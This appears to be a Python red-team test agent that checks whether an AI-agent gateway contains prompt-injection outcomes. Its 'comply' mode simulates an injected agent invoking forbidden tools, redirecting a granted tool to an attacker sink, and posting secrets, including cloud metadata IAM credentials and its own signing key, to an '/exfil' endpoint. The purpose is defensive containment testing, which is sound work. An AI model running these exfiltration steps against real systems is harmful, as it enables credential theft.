"""V3 RED-TEAM AGENT -- a lab-owned external agent that runs ONE injection
scenario in one of two modes (Rule 2):

  mode=resist  -> the model resisted: the agent performs only its legitimate
                  work and refrains from the injected action (records that).
  mode=comply  -> the model complied (forced/simulated): the agent ATTEMPTS the
                  injected forbidden action, so we can assert ACT contains it
                  despite compliance.

This agent imports NOTHING from `app` (AST-assertable by the harness). It talks
to ACT only over HTTP with ACT-HMAC-SHA256 signed requests, exactly like the
Wave-1 agents. Its config carries canary tokens that must never reach ACT's
own records. It reads/writes only lab-owned loopback/in-network destinations.

It never executes host code, never opens a shell, never touches a non-lab
destination. The attacker-sim it may reach is a lab-owned SINK inside the
egress-deny wrapper -- reaching it is an observation, not an escape.

Output: one JSON line describing exactly what was attempted and observed.
"""
import hashlib
import hmac
import json
import sys
import time
import urllib.error
import urllib.request
import uuid
from pathlib import Path

SCHEME = "ACT-HMAC-SHA256"


def _unwrap(obj):
    if isinstance(obj, dict) and "data" in obj and obj.get("success") is True:
        return obj["data"]
    return obj


def signed_call(base, path, key_id, secret, payload):
    body = json.dumps(payload).encode()
    ts, nonce = str(int(time.time())), uuid.uuid4().hex
    digest = hashlib.sha256(body).hexdigest()
    to_sign = "\n".join([SCHEME, "POST", path, ts, nonce, digest])
    sig = hmac.new(secret.encode(), to_sign.encode(), hashlib.sha256).hexdigest()
    req = urllib.request.Request(base + path, data=body, method="POST", headers={
        "Content-Type": "application/json", "X-ACT-Key-Id": key_id,
        "X-ACT-Timestamp": ts, "X-ACT-Nonce": nonce, "X-ACT-Signature": sig})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, _unwrap(json.loads(r.read().decode()))
    except urllib.error.HTTPError as e:
        try:
            return e.code, _unwrap(json.loads(e.read().decode() or "{}"))
        except Exception:
            return e.code, {}
    except Exception as e:
        return 0, {"transport_error": str(e)[:200]}


def plain_get(url):
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)[:200]


def raw_post(url, obj):
    """The agent's OWN socket to a lab sink -- ACT does not mediate this."""
    try:
        data = json.dumps(obj).encode()
        req = urllib.request.Request(url, data=data, method="POST", headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)[:200]


def _secret_value(cfg, name):
    if name == "object_store":
        s, body = plain_get(cfg["object_store"] + "/objects/payroll_export.csv")
        return body
    if name == "metadata_decoy":
        s, body = plain_get(cfg["metadata_decoy"] + "/latest/meta-data/iam/security-credentials/lab-role")
        return body
    if name == "grant_secret":
        # the injection tries to exfiltrate the agent's own signing secret
        return json.dumps({"key_id": cfg.get("key_id"), "secret": cfg.get("secret")})
    return f"UNKNOWN-SECRET-{name}"


def run_scenario(cfg, scenario, mode):
    fa = scenario["forbidden_action"]
    kind = fa["kind"]
    out = {
        "scenario_id": scenario["id"], "vector": scenario["vector"], "mode": mode,
        "forbidden_kind": kind, "attempted": False, "gateway": None, "raw_sink": None,
        "read": None, "notes": [],
    }

    # Legitimate work every run does (T1 read-only), so a run is a realistic agent.
    out["legit_t1_object_list"] = plain_get(cfg["object_store"] + "/objects")[0]

    if mode == "resist":
        out["attempted"] = False
        out["notes"].append("model resisted the injection; no forbidden action taken")
        print(json.dumps(out))
        return

    # mode == comply : perform the injected forbidden action.
    out["attempted"] = True

    if kind == "invoke_forbidden_capability":
        target_id = cfg["forbidden_tools"].get(fa["target"])
        status, resp = signed_call(cfg["act_base"], "/api/v1/bridge/capability", cfg["key_id"], cfg["secret"],
                                   {"capability": "http_tool.invoke", "target_ref": target_id,
                                    "params": {"body": {"injected": True, "canary_ref": fa.get("canary")}}})
        outcome = resp.get("outcome") if isinstance(resp, dict) else None
        reason = resp.get("denial_reason") or (resp.get("error") or {}).get("message") if isinstance(resp, dict) else None
        out["gateway"] = {"target": fa["target"], "status": status, "outcome": outcome, "denial_reason": reason}

    elif kind == "redirect_granted_tool":
        # Confused deputy: call the GRANTED tool but inject params trying to
        # redirect it to the attacker sink. ACT builds egress from the frozen
        # tool snapshot, so the destination must NOT change.
        target_id = cfg["allowed_tool"]
        status, resp = signed_call(cfg["act_base"], "/api/v1/bridge/capability", cfg["key_id"], cfg["secret"],
                                   {"capability": "http_tool.invoke", "target_ref": target_id,
                                    "params": {"body": {"redirect": True},
                                               "url": cfg["attacker_sim"] + "/steal",
                                               "endpoint_reference": cfg["attacker_sim"] + "/steal",
                                               "target_ref": cfg["forbidden_tools"].get("exfil"),
                                               "allowed_hosts": ["*"]}})
        outcome = resp.get("outcome") if isinstance(resp, dict) else None
        out["gateway"] = {"target": "granted_finance_purchase(redirect-attempt)", "status": status,
                          "outcome": outcome, "dispatch_status": resp.get("dispatch_status") if isinstance(resp, dict) else None}
        out["notes"].append("injected url/endpoint/allowed_hosts params; harness checks the sink log to confirm no redirect")

    elif kind == "raw_exfil_to_sink":
        secret = _secret_value(cfg, fa["secret"])
        status, body = raw_post(cfg["attacker_sim"] + "/exfil",
                                {"stolen": secret, "scenario": scenario["id"], "note": "raw agent socket, not via ACT"})
        out["raw_sink"] = {"secret_name": fa["secret"], "sink_status": status, "sink_reachable": status == 200}
        out["notes"].append("ACT is a gateway, not an inline proxy: this raw socket is NOT mediated by ACT; "
                            "the wrapper bounds it to the lab sink")

    elif kind == "read_then_check_leak":
        s, body = plain_get(cfg["object_store"] + "/objects/payroll_export.csv")
        out["read"] = {"secret_name": fa["secret"], "status": s, "bytes": len(body)}
        out["notes"].append("benign read; harness asserts the canary never appears in ACT's own records")

    else:
        out["notes"].append(f"unknown forbidden_action.kind {kind}")

    print(json.dumps(out))


def main():
    cfg = json.loads(Path(sys.argv[1]).read_text(encoding="utf-8"))
    scenario = json.loads(Path(sys.argv[2]).read_text(encoding="utf-8"))
    mode = sys.argv[3]
    run_scenario(cfg, scenario, mode)


if __name__ == "__main__":
    main()
